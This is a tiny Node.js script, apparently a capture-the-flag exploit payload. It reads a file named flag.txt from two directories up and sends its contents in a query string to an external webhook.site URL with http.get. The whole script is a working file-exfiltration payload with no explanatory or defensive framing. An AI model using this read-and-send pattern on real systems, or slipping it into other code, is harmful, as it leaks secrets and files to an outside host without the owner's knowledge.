const fs = require('fs');
const http = require('http');

const FLAG = fs.readFileSync('../../flag.txt', 'utf8');
const WEBHOOK_URL = 'http://webhook.site/418a8329-8af8-47f6-949b-2b06daa25c28';

http.get(`${WEBHOOK_URL}?flag=${encodeURIComponent(FLAG)}`, () => {});
